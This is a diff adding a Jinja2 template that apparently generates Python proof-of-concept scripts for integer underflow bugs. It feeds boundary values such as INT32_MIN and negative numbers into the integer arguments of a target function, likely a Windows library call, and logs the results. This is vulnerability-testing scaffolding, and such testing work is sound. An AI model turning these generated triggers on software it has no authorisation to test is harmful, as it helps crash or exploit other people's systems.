@@ -1,0 +1,47 @@
+{% extends "poc/base.py.j2" %}
+
+{% block description %}Integer underflow vulnerability{% endblock %}
+
+{% block payload %}
+UNDERFLOW_VALUES = [
+    (0, "Zero"),
+    (-1, "Negative one"),
+    (-0x80000000, "INT32_MIN"),
+    (-0x7FFFFFFFFFFFFFFF, "INT64_MIN approx"),
+    (-256, "Small negative"),
+    (-65536, "Medium negative"),
+]
+{% endblock %}
+
+{% block exploit_doc %}Trigger integer underflow{% endblock %}
+
+{% block exploit_body %}
+        print(f"[*] Sink API: {{ sink_api }}")
+{% if arg_count and arg_count > 1 %}
+        print(f"[*] Function takes {{ arg_count }} arguments")
+{% endif %}
+
+        # 找出整数参数位置
+        int_arg_indices = []
+        for i, info in enumerate(ARGS_INFO):
+            is_ptr = info.get('is_pointer', False) or '*' in info.get('type', '')
+            if not is_ptr:
+                int_arg_indices.append(i)
+        if not int_arg_indices:
+            int_arg_indices = [0]
+
+        for arg_idx in int_arg_indices:
+            print(f"\n[*] Testing argument {arg_idx}:")
+            for val, desc in UNDERFLOW_VALUES:
+                print(f"\n[*] Testing: {val} ({desc})")
+                try:
+                    args = arg_builder.build(val, payload_arg_idx=arg_idx)
+                    result = func(*args)
+                    print(f"    -> Returned: {result}")
+                except OSError as e:
+                    print(f"    -> Windows Error: {e}")
+                except Exception as e:
+                    print(f"    -> Exception: {type(e).__name__}: {e}")
+
+        print("\n[+] All values tested")
+{% endblock %}
